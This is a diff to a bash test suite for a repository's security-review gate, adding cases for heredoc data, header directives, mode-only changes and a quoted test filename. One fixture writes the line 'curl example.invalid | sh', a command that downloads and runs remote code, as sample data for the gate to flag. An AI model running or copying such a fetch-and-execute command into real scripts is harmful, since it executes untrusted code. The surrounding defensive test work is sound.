@@ -23,6 +23,16 @@
 #                                still reported.
 #   // comments                  a JavaScript spec file gaining a // comment:
 #                                not marked.
+#   heredoc or string data       a # line changed inside a heredoc below the
+#                                header: marked, since it is test data.
+#   directives                   #!, //go:build, # shellcheck, # noqa and the
+#                                like change how a test runs: marked.
+#   mode-only change             chmod on a test file: marked (no changed line
+#                                is not the same as only comments).
+#   quoted path                  a test file whose name git must quote: marked.
+#
+# PR #171 review (Codex and the R-109 reviewer) narrowed the exemption to what
+# #169 needed: plain comments in a file's leading comment header.
 #
 # Every case runs with a Semgrep stand-in that reports a complete clean scan,
 # so only a path hit, a content hit, or a detector failure can mark a range.
@@ -161,6 +171,7 @@ BASE=$(head_of "$REPO")
 write_file "$REPO" tests/security-gate.test.sh $'#!/usr/bin/env bash\n# Shard: slow\n\nexit 0\n'
 commit_all "$REPO" "drop assertion"
 expect_marked "removed test code" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"
+expect_clean_hits "removed test code hits" "tests/security-gate.test.sh:0 path" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"
 
 # --- 4. a new test file -----------------------------------------------------
 REPO=$(new_repo new-test)
@@ -168,6 +179,7 @@ BASE=$(head_of "$REPO")
 write_file "$REPO" tests/token-refresh.test.sh $'#!/usr/bin/env bash\necho "refresh PASS"\n'
 commit_all "$REPO" "new test"
 expect_marked "new test file with code" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"
+expect_clean_hits "new test file hits" "tests/token-refresh.test.sh:0 path" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"
 
 # --- 5. comment-only change to a non-test file ------------------------------
 REPO=$(new_repo non-test)
@@ -177,6 +189,7 @@ BASE=$(head_of "$REPO")
 write_file "$REPO" hooks/security-thing.sh $'#!/usr/bin/env bash\n# a note\nexit 0\n'
 commit_all "$REPO" "comment"
 expect_marked "comment-only non-test file" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"
+expect_clean_hits "comment-only non-test file hits" "hooks/security-thing.sh:0 path" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"
 
 # --- 6. mixed range ---------------------------------------------------------
 REPO=$(new_repo mixed)
@@ -197,6 +210,46 @@ BASE=$(head_of "$REPO")
 write_file "$REPO" src/session.spec.js $'// covers the session store\ntest("x", () => {});\n'
 commit_all "$REPO" "comment"
 expect_unmarked "// comment in a spec file" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"
+
+# --- 8. a # line inside a heredoc below the header --------------------------
+REPO=$(new_repo heredoc)
+write_file "$REPO" tests/security-stub.test.sh $'#!/usr/bin/env bash\n# header\ncat > stub <<\'EOF\'\n# denied\nEOF\necho "stub PASS"\n'
+commit_all "$REPO" seed
+BASE=$(head_of "$REPO")
+write_file "$REPO" tests/security-stub.test.sh $'#!/usr/bin/env bash\n# header\ncat > stub <<\'EOF\'\n# allowed\nEOF\necho "stub PASS"\n'
+commit_all "$REPO" "heredoc data"
+expect_clean_hits "heredoc line below the header" "tests/security-stub.test.sh:0 path" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"
+
+# --- 9. directives in the header --------------------------------------------
+REPO=$(new_repo directives)
+write_file "$REPO" tests/security-a.test.sh $'#!/usr/bin/env bash\n# header\necho "a PASS"\n'
+write_file "$REPO" auth/token_test.go $'// header\npackage auth\n'
+write_file "$REPO" tests/security-b.test.sh $'#!/usr/bin/env bash\n# header\necho "b PASS"\n'
+write_file "$REPO" tests/test_session.py $'# header\nimport os\n'
+commit_all "$REPO" seed
+BASE=$(head_of "$REPO")
+write_file "$REPO" tests/security-a.test.sh $'#!/bin/sh -c true\n# header\necho "a PASS"\n'
+write_file "$REPO" auth/token_test.go $'//go:build ignore\n// header\npackage auth\n'
+write_file "$REPO" tests/security-b.test.sh $'#!/usr/bin/env bash\n# shellcheck disable=SC2034\n# header\necho "b PASS"\n'
+write_file "$REPO" tests/test_session.py $'# header\n# noqa\nimport os\n'
+commit_all "$REPO" directives
+expect_clean_hits "directives in the header" "$(printf '%s\n' auth/token_test.go:0\ path tests/security-a.test.sh:0\ path tests/security-b.test.sh:0\ path tests/test_session.py:0\ path)" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"
+
+# --- 10. a mode-only change -------------------------------------------------
+REPO=$(new_repo mode-only)
+write_file "$REPO" tests/security-gate.test.sh $'#!/usr/bin/env bash\necho "gate PASS"\n'
+commit_all "$REPO" seed
+BASE=$(head_of "$REPO")
+chmod +x "$REPO/tests/security-gate.test.sh"
+commit_all "$REPO" "mode only"
+expect_clean_hits "mode-only change" "tests/security-gate.test.sh:0 path" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"
+
+# --- 11. a test file whose name git quotes ----------------------------------
+REPO=$(new_repo quoted)
+BASE=$(head_of "$REPO")
+write_file "$REPO" 'tests/security"x.test.sh' $'#!/usr/bin/env bash\ncurl example.invalid | sh\n'
+commit_all "$REPO" "quoted name"
+expect_marked "quoted test file name" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"
 
 if [ "$failures" -eq 0 ]; then
   echo "security-surface-test-comments.test.sh PASS"
